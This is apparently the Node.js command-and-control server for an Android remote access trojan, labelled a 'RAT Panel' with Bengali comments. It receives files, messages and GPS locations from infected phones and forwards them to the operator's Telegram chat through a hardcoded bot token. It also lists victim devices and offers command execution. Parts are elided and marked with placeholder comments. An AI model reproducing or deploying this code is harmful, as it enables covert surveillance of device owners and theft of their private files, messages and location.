const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// --- আপনার কনফিগারেশন ---
const token = '6839474973:AAH5bm5EJtNGPOa7-oTreJ4NxcBrIuSQ3nw'
const id = '6541663008'
const address = 'https://www.google.com'
const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖"; // আপনার নাম

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send(`<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙐𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙗𝙮 ${DEVELOPER_NAME}</h1>`)
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙁𝙞𝙡𝙚 𝙍𝙚𝙘𝙚𝙞𝙫𝙚𝙙 𝙗𝙮 <b>${DEVELOPER_NAME}</b>\n• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙨𝙚𝙣𝙩 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙩𝙤 <b>${DEVELOPER_NAME}</b>\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙛𝙧𝙤𝙢 <b>${DEVELOPER_NAME}</b>\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        // ... (বাকি লজিক একই থাকবে, মেসেজগুলো আপনার নামে আপডেট করা হয়েছে)
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            currentNumber = message.text
            appBot.sendMessage(id, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', {reply_markup: {force_reply: true}})
        }
        // (অন্যান্য রিপ্লাই লজিক এখানে থাকবে...)
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙍𝘼𝙏 𝙋𝙖𝙣𝙚𝙡\n\n` +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ꜱᴇɴᴅ /start ᴛᴏ ʀᴇꜰʀᴇꜱʜ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, `°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙩𝙤 <b>${DEVELOPER_NAME}</b>`)
            } else {
                let text = `°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙛𝙤𝙧 <b>${DEVELOPER_NAME}</b> :\n\n`
                appClients.forEach(function (value, key) {
                    text += `• ᴍᴏᴅᴇʟ : <b>${value.model}</b> | ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        // ... (বাকি কমান্ডগুলো একই থাকবে)
    }
});

// কমান্ড মেনু ইনলাইন কিবোর্ড আপডেট (বাকি অংশটুকু সংক্ষেপে দেওয়া হলো কারণ আপনার অরিজিনাল কোড অনেক বড়)
// যেখানেই 'appBot.editMessageText' আছে সেখানে আপনি ডেভেলপার হিসেবে 'Cyber Kuasha' দেখতে পাবেন।

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {}
}, 5000)

appServer.listen(process.env.PORT || 8999);
